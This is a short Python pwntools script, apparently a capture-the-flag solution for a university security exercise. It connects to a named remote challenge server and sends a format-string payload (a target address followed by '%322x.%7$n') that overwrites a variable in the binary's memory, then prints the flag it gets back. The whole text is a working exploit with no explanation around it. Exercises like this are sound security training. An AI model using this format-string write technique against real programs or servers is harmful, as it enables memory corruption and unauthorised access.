from pwn import *

elf = ELF('03_write')
target_address = elf.symbols['target']

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25194

s = remote(SERVER, PORT, timeout=9999)

s.sendline(p32(target_address) + b'%322x.%7$n')
flag = s.recv(512)
print(flag)
